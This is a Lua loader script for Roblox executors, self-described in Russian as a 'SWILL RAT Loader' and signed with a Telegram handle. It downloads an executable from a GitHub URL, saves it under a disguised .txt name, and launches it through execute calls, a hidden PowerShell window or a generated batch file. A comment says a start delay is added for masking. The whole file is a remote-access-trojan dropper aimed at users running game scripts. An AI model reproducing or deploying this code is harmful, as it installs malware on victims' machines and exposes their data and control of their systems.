-- SWILL RAT Loader для Roblox
local link = "https://raw.githubusercontent.com/lehaolejnikov38-maker/sex/raw/main/bulgod.exe"
local filename = "startappDRX.txt"
local cmd = "cmd.exe /c start " .. filename

-- Проверяем наличие writefile
if not writefile then
    error("writefile не доступен в этом исполнителе")
end

-- Функция скачивания и сохранения
local function downloadAndExecute()
    print("[SWILL] Начинаю загрузку...")
    
    -- Скачиваем файл
    local content = game:HttpGet(link, true)
    if not content then
        error("Не удалось скачать файл")
    end
    
    print("[SWILL] Файл скачан, размер: " .. #content .. " байт")
    
    -- Сохраняем на диск
    writefile(filename, content)
    print("[SWILL] Файл сохранен как: " .. filename)
    
    -- Запускаем командой
    if execute then
        execute(cmd)
        print("[SWILL] Команда выполнена через execute()")
    elseif syn and syn.execute then
        syn.execute(cmd)
        print("[SWILL] Команда выполнена через syn.execute()")
    else
        -- Альтернативный метод через PowerShell
        local psCommand = "powershell -WindowStyle Hidden -Command \"Start-Process '" .. cmd:gsub("'", "''") .. "'\""
        if execute then
            execute(psCommand)
        else
            -- Последний вариант: создаем BAT файл и запускаем его
            local batContent = "@echo off\n" .. cmd .. "\npause"
            writefile("launch.bat", batContent)
            if execute then
                execute("cmd.exe /c start launch.bat")
            end
        end
        print("[SWILL] Использован альтернативный метод запуска")
    end
    
    print("[SWILL] Выполнение завершено")
end

-- Запускаем с задержкой
spawn(function()
    wait(3) -- Задержка 3 секунды для маскировки
    local success, err = pcall(downloadAndExecute)
    if not success then
        warn("[SWILL] Ошибка: " .. tostring(err))
        
        -- Попытка через более простой метод
        spawn(function()
            wait(2)
            pcall(function()
                -- Прямой HTTP запрос к локальному серверу
                local executeUrl = "http://localhost:8080/run?cmd=" .. game:HttpService:UrlEncode(cmd)
                game:HttpGet(executeUrl)
                print("[SWILL] Попытка через локальный сервер")
            end)
        end)
    end
end)

-- Сообщение об успешной инициализации
print("[SWILL] Loader активирован. TG: t.me/Swill_Way")
return "[SWILL] Готов к работе"
